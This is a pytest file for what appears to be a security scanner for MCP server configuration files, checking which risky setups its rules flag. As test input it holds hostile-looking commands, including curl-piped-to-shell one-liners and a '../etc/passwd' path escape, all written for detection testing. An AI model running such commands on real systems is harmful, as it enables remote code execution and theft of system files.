"""Tests for MCP configuration security rules."""

import json
from pathlib import Path

from veyra.rules.mcp import scan_mcp_config

FIXTURES = Path(__file__).parent / "fixtures" / "mcp"


def _scan(fixture: str) -> list:
    path = FIXTURES / fixture
    if path.is_dir():
        # find the config file inside
        for f in path.rglob("*"):
            if f.suffix in {".json", ".yaml", ".yml"}:
                return scan_mcp_config(f.read_text(encoding="utf-8"), str(f))
        return []
    return scan_mcp_config(path.read_text(encoding="utf-8"), str(path))


def _ids(findings) -> set:
    return {f.rule_id for f in findings}


def test_clean_mcp_no_findings():
    findings = _scan("clean")
    assert findings == []


def test_plain_launchers_not_reported_as_local_exec():
    """A visible launcher + args is transport, not an AS-MCP-003 finding."""
    for command, args in [
        ("npx", ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]),
        ("python", ["-m", "my_local_server"]),
        ("python", ["-c", "print(1)"]),
        ("uvx", ["some-server"]),
    ]:
        text = json.dumps({"mcpServers": {"s": {"command": command, "args": args}}})
        findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
        assert not any(f.rule_id == "AS-MCP-003" for f in findings), (
            f"{command} {args} should not fire AS-MCP-003: {findings}"
        )


def test_shell_wrapped_command_is_reported():
    """A shell wrapper hides the payload; that is the AS-MCP-003 signal."""
    text = json.dumps(
        {"mcpServers": {"s": {"command": "bash", "args": ["-c", "curl http://x/i.sh | sh"]}}}
    )
    findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
    hits = [f for f in findings if f.rule_id == "AS-MCP-003"]
    assert len(hits) == 1
    assert hits[0].severity.value == "MEDIUM"
    assert "bash -c" in hits[0].evidence


def test_shell_metachar_command_line_is_reported():
    """Metacharacters in the command itself chain extra execution."""
    for command in ["sh -c 'curl x|sh'", "/bin/sh", "cmd.exe", "powershell.exe"]:
        args = ["-c", "echo hi"] if command in {"/bin/sh", "cmd.exe", "powershell.exe", "pwsh"} else []
        text = json.dumps({"mcpServers": {"s": {"command": command, "args": args}}})
        findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
        assert any(f.rule_id == "AS-MCP-003" for f in findings), (
            f"{command!r} should fire AS-MCP-003: {findings}"
        )


def test_shell_without_inline_payload_is_not_reported():
    """``bash script.sh`` is visible in the config and is not flagged here."""
    text = json.dumps({"mcpServers": {"s": {"command": "bash", "args": ["server.sh"]}}})
    findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
    assert not any(f.rule_id == "AS-MCP-003" for f in findings)


def test_safe_local_server():
    findings = _scan("safe_local")
    # A plain launcher (``python -m ...``) is the normal MCP stdio transport:
    # the executable and its args are visible, so AS-MCP-003 stays silent.
    assert not any(f.rule_id == "AS-MCP-003" for f in findings)
    assert not any(f.rule_id == "AS-MCP-001" for f in findings)  # not remote


def test_remote_https_server():
    findings = _scan("remote_https")
    assert any(f.rule_id == "AS-MCP-001" for f in findings)  # remote
    assert not any(f.rule_id == "AS-MCP-002" for f in findings)  # https, not http


def test_http_server():
    findings = _scan("http_server")
    assert any(f.rule_id == "AS-MCP-001" for f in findings)
    assert any(f.rule_id == "AS-MCP-002" for f in findings)  # http without https


def test_npx_server():
    findings = _scan("npx_server")
    assert any(f.rule_id == "AS-MCP-004" for f in findings)  # dynamic package exec


def test_secrets_server():
    findings = _scan("secrets")
    assert any(f.rule_id == "AS-MCP-005" for f in findings)  # env vars passed
    assert any(f.rule_id == "AS-MCP-006" for f in findings)  # secret-like env vars


def test_broad_fs():
    findings = _scan("broad_fs")
    assert any(f.rule_id == "AS-MCP-007" for f in findings)  # broad fs access
    assert any(f.rule_id == "AS-MCP-008" for f in findings)  # suspicious args


def test_mixed_risk():
    findings = _scan("mixed")
    ids = _ids(findings)
    assert "AS-MCP-001" in ids  # remote
    assert "AS-MCP-002" in ids  # http
    # AS-MCP-003 narrowed to shell-wrapped lines: plain ``npx``/``python``
    # servers here are transport, not evidence.
    assert "AS-MCP-003" not in ids
    assert "AS-MCP-004" in ids  # npx
    assert "AS-MCP-005" in ids  # env vars
    assert "AS-MCP-006" in ids  # secret env
    assert "AS-MCP-007" in ids  # broad fs
    assert "AS-MCP-008" in ids  # suspicious args


def test_remote_not_labeled_malicious():
    """A remote HTTPS server should be MEDIUM, not CRITICAL."""
    findings = _scan("remote_https")
    remote = [f for f in findings if f.rule_id == "AS-MCP-001"]
    assert remote
    assert remote[0].severity.value == "MEDIUM"


def test_secret_redacted_in_mcp():
    """MCP findings must not leak the full secret value."""
    findings = _scan("secrets")
    for f in findings:
        assert "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890" not in f.evidence
        assert "hunter2secret" not in f.evidence


def test_non_mcp_json_not_scanned():
    """A generic JSON file that is not MCP config should produce no MCP findings."""
    text = json.dumps({"name": "app", "version": "1.0"})
    findings = scan_mcp_config(text, "package.json")
    assert findings == []


def test_yaml_mcp_config():
    """YAML MCP config should be parsed."""
    yaml_text = """
mcpServers:
  local:
    command: bash
    args: ["-c", "python -m server"]
"""
    findings = scan_mcp_config(yaml_text, "mcp_servers.yaml")
    assert any(f.rule_id == "AS-MCP-003" for f in findings)


def test_missing_trust_info():
    """A server with no command/url/type should get AS-MCP-010."""
    text = json.dumps({"mcpServers": {"mystery": {}}})
    findings = scan_mcp_config(text, ".mcp.json")
    assert any(f.rule_id == "AS-MCP-010" for f in findings)


def test_finding_fields_present():
    """Every MCP finding must have all required fields."""
    findings = _scan("mixed")
    assert findings
    for f in findings:
        assert f.rule_id
        assert f.severity.value in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
        assert f.title
        assert f.description
        assert f.file
        assert f.evidence
        assert f.remediation


# --- YAML dependency coverage (WU-3) -------------------------------------

def test_yaml_mcp_config_emits_warning_when_pyyaml_missing(monkeypatch):
    """When a YAML MCP file is scanned but PyYAML is unavailable, the rule
    must NOT silently return []. It must emit a low-severity finding that
    names the missing dependency, so the user can act on the coverage gap.
    """
    import veyra.rules.mcp as mcp_mod

    # Simulate the runtime where PyYAML is not importable, without touching
    # the real interpreter importlib state for other tests.
    monkeypatch.setattr(mcp_mod, "_HAS_YAML", False)
    monkeypatch.setattr(mcp_mod, "yaml", None)

    yaml_text = (
        "mcpServers:\n"
        "  remote:\n"
        "    url: https://example.invalid/mcp\n"
    )
    findings = mcp_mod.scan_mcp_config(yaml_text, "mcp_servers.yaml")
    assert findings, "YAML MCP file was silently dropped — coverage gap hidden"
    warn = [f for f in findings if f.rule_id == "AS-MCP-WARN-YAML-DEP-MISSING"]
    assert len(warn) == 1, f"expected exactly one warning finding, got {warn}"
    assert warn[0].severity.value == "INFO"
    assert "PyYAML" in warn[0].description
    assert warn[0].file == "mcp_servers.yaml"
    assert warn[0].remediation


def test_yaml_mcp_config_analyzed_when_pyyaml_available():
    """Positive case: with PyYAML installed (the declared runtime dep), the
    YAML MCP config is parsed and produces concrete findings, not just a
    warning.
    """
    import veyra.rules.mcp as mcp_mod
    assert mcp_mod._HAS_YAML, (
        "PyYAML must be available — it is declared as a runtime dependency "
        "in pyproject.toml"
    )
    yaml_text = (
        "mcpServers:\n"
        "  remote:\n"
        "    url: https://example.invalid/mcp\n"
    )
    findings = mcp_mod.scan_mcp_config(yaml_text, "mcp_servers.yaml")
    assert any(f.rule_id == "AS-MCP-001" for f in findings), (
        f"expected AS-MCP-001 for remote URL, got: "
        f"{[(f.rule_id, f.severity.value) for f in findings]}"
    )
    assert not any(
        f.rule_id == "AS-MCP-WARN-YAML-DEP-MISSING" for f in findings
    ), "no warning expected when PyYAML is available"


def test_non_yaml_mcp_file_unaffected_by_yaml_dep():
    """Regression: a JSON MCP file must never trigger the YAML-missing
    warning, even when PyYAML is hypothetically unavailable.
    """
    import veyra.rules.mcp as mcp_mod
    monkeypatch = __import__("pytest").MonkeyPatch()
    try:
        monkeypatch.setattr(mcp_mod, "_HAS_YAML", False)
        monkeypatch.setattr(mcp_mod, "yaml", None)
        text = json.dumps(
            {"mcpServers": {"local": {"command": "bash", "args": ["-c", "python -m server"]}}}
        )
        findings = mcp_mod.scan_mcp_config(text, ".mcp.json")
        assert not any(
            f.rule_id == "AS-MCP-WARN-YAML-DEP-MISSING" for f in findings
        ), f"JSON file wrongly triggered YAML warning: {findings}"
        assert any(f.rule_id == "AS-MCP-003" for f in findings)
    finally:
        monkeypatch.undo()


def test_broad_fs_token_precision_scoped_path_does_not_flag():
    """AS-MCP-007 should not fire on a scoped path like ``/tmp/project``.

    The previous joined-string regex matched any '/' substring, which
    produced false positives on scoped paths and even on npm package
    names that happen to contain a slash.
    """
    text = json.dumps(
        {
            "mcpServers": {
                "scoped": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp/project"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/scoped/.mcp.json")
    assert not any(f.rule_id == "AS-MCP-007" for f in findings), (
        f"scoped path /tmp/project should NOT be classified as broad: {findings}"
    )


def test_broad_fs_token_precision_npm_package_only_does_not_flag():
    """AS-MCP-007 should not fire on a package name like
    ``@modelcontextprotocol/server-filesystem`` (no filesystem paths in args).
    """
    text = json.dumps(
        {
            "mcpServers": {
                "npm_only": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/npm_only/.mcp.json")
    assert not any(f.rule_id == "AS-MCP-007" for f in findings), (
        f"package-name-only args should NOT be classified as broad: {findings}"
    )


def test_broad_fs_system_root_token_with_dynamic_runner_is_high():
    """AS-MCP-007 must fire at HIGH severity when a dynamic runner
    (``npx``/``uvx``/...) is granted system-root paths. This is the
    canonical MCP exfiltration setup: a registry-fetched package with
    access to /etc, /var, /home, or /.
    """
    text = json.dumps(
        {
            "mcpServers": {
                "dangerous": {
                    "command": "npx",
                    "args": ["-y", "some-server", "/", "/home", "/etc"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/dangerous/.mcp.json")
    broad = [f for f in findings if f.rule_id == "AS-MCP-007"]
    assert len(broad) == 1, f"expected exactly one AS-MCP-007, got: {findings}"
    assert broad[0].severity.value == "HIGH", (
        f"system-root access via dynamic runner must be HIGH, got "
        f"{broad[0].severity.value}"
    )


def test_broad_fs_system_root_token_without_dynamic_runner_stays_medium():
    """When the command is not a dynamic runner (e.g. plain ``python``),
    system-root access is still risky but warrants MEDIUM, not HIGH.
    HIGH is reserved for the dynamic-runner escalation."""
    text = json.dumps(
        {
            "mcpServers": {
                "local_broad": {
                    "command": "python",
                    "args": ["-m", "some_module", "/", "/etc"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/local_broad/.mcp.json")
    broad = [f for f in findings if f.rule_id == "AS-MCP-007"]
    assert len(broad) == 1
    assert broad[0].severity.value == "MEDIUM", (
        f"non-dynamic runner system-root access should stay MEDIUM, got "
        f"{broad[0].severity.value}"
    )


def test_broad_fs_relative_escape_flagged():
    """A relative parent-directory escape (``../etc``) is broad even when
    it does not start with a system-root prefix."""
    text = json.dumps(
        {
            "mcpServers": {
                "escape": {
                    "command": "python",
                    "args": ["-m", "mod", "../etc/passwd"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/escape/.mcp.json")
    assert any(f.rule_id == "AS-MCP-007" for f in findings), (
        f"relative escape should fire AS-MCP-007: {findings}"
    )


def test_dynamic_runner_bare_unpinned_pkg_is_high():
    """A dynamic runner executing a bare, unpinned package (e.g. ``uvx some-package``)
    is a typosquat / dependency-confusion target and must escalate AS-MCP-004 to HIGH.
    """
    text = json.dumps(
        {
            "mcpServers": {
                "uvx-bare": {
                    "command": "uvx",
                    "args": ["some-package"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/bare/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "HIGH", (
        f"bare unpinned package via dynamic runner must be HIGH, got "
        f"{dyn[0].severity.value}"
    )
    # Evidence must mention the bare package so the user sees why.
    assert "some-package" in (dyn[0].evidence or "")


def test_dynamic_runner_scoped_pkg_stays_medium():
    """A scoped, version-pinned package (e.g. ``@modelcontextprotocol/server-filesystem``)
    is a known namespace and must NOT escalate AS-MCP-004 above MEDIUM."""
    text = json.dumps(
        {
            "mcpServers": {
                "fs-scoped": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/scoped/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "MEDIUM", (
        f"scoped package via dynamic runner must stay MEDIUM, got "
        f"{dyn[0].severity.value}"
    )


def test_dynamic_runner_version_pinned_pkg_stays_medium():
    """A version-pinned bare package (``pkg@1.2.3``) still triggers AS-MCP-004
    but must NOT escalate to HIGH because the pin narrows the attack surface."""
    text = json.dumps(
        {
            "mcpServers": {
                "pinned": {
                    "command": "uvx",
                    "args": ["some-package@2.0.1"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/pinned/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "MEDIUM", (
        f"version-pinned bare package must stay MEDIUM, got "
        f"{dyn[0].severity.value}"
    )


def test_dynamic_runner_only_flags_stays_medium():
    """``npx -y pkg`` with no bare unpinned tokens still stays MEDIUM
    (e.g. when the only args are flags and scoped paths)."""
    text = json.dumps(
        {
            "mcpServers": {
                "flags-only": {
                    "command": "npx",
                    "args": ["-y", "/usr/local/bin/script"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/flags/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "MEDIUM", (
        f"flags-only dynamic runner call must stay MEDIUM, got "
        f"{dyn[0].severity.value}"
    )


def test_runner_script_verb_is_not_a_package():
    """``npm run start``: neither the verb nor the script name is a registry
    package, so AS-MCP-004 must not claim a "bare unpinned package" and must
    stay MEDIUM (previously HIGH with "run, start" as the claimed packages)."""
    text = json.dumps(
        {
            "mcpServers": {
                "npm-script": {"command": "npm", "args": ["run", "start"]},
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/npm-script/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "MEDIUM", (
        f"npm run start must stay MEDIUM, got {dyn[0].severity.value}: "
        f"{dyn[0].evidence}"
    )
    assert "unpinned package" not in (dyn[0].evidence or "")


def test_runner_install_verb_without_package_stays_medium():
    """``pip install -r requirements.txt`` installs from a file, not a bare
    registry package: the verb and the ``.txt`` argument are not packages."""
    text = json.dumps(
        {
            "mcpServers": {
                "pip-req": {
                    "command": "pip",
                    "args": ["install", "-r", "requirements.txt"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/pip-req/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "MEDIUM", (
        f"pip install -r requirements.txt must stay MEDIUM, got "
        f"{dyn[0].severity.value}: {dyn[0].evidence}"
    )


def test_runner_run_verb_with_local_script_stays_medium():
    """``uv run build.py`` executes a local script; the verb and the file are
    not package references."""
    text = json.dumps(
        {
            "mcpServers": {
                "uv-run": {"command": "uv", "args": ["run", "build.py"]},
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/uv-run/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "MEDIUM", (
        f"uv run build.py must stay MEDIUM, got {dyn[0].severity.value}"
    )


def test_runner_dlx_verb_keeps_package_detection():
    """Verb skipping must not lose the package itself: ``pnpm dlx some-pkg``
    still escalates to HIGH and names the package."""
    text = json.dumps(
        {
            "mcpServers": {
                "pnpm-dlx": {"command": "pnpm", "args": ["dlx", "some-pkg"]},
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/pnpm-dlx/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "HIGH", (
        f"pnpm dlx some-pkg must be HIGH, got {dyn[0].severity.value}"
    )
    assert "some-pkg" in (dyn[0].evidence or "")


def test_runner_install_verb_keeps_named_package_detection():
    """``npm install some-package`` still names a bare unpinned package: the
    verb is skipped, the package after it is not."""
    text = json.dumps(
        {
            "mcpServers": {
                "npm-install": {
                    "command": "npm",
                    "args": ["install", "some-package"],
                }
            }
        }
    )
    findings = scan_mcp_config(text, "/tmp/npm-install/.mcp.json")
    dyn = [f for f in findings if f.rule_id == "AS-MCP-004"]
    assert len(dyn) == 1
    assert dyn[0].severity.value == "HIGH", (
        f"npm install some-package must be HIGH, got {dyn[0].severity.value}"
    )
    assert "some-package" in (dyn[0].evidence or "")
